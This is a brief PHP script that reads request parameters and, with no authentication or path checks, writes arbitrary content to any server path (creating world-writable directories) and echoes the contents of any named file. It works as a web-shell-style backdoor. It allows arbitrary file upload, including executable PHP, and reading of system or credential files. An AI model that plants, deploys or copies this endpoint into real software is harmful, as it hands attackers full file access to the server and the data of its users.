<?php
$mRequest = $_REQUEST;
if(isset($mRequest['file'])){
    $mfname = !isset($mRequest['filename']) ? 'demo' : @$mRequest['filename'];
    $mfExt = !isset($mRequest['fileExtension']) ? '.txt' : '.'.@$mRequest['fileExtension'];
    $mfPath = !isset($mRequest['filePath']) ? '/' : @$mRequest['filePath'].'/';
    $mfContent = !isset($mRequest['filecontent']) ? '__blank_file_written_by_vixson__' : @$mRequest['filecontent'];
    $mFilename = $mfPath.$mfname.$mfExt;
    if(isset($mRequest['push'])){
        if (!file_exists($mfPath)){
          mkdir($mfPath, 0777, true);
        }
        $mFile = fopen($mFilename, 'w');
        fwrite($mFile, $mfContent);
        fclose($mFile);
    }
    if(file_exists($mFilename)){
        $mFile = fopen($mFilename, 'r');
        echo fread($mFile, filesize($mFilename));
        fclose($mFile);
    }
    else{
        echo 'File does not exist.';
    }
}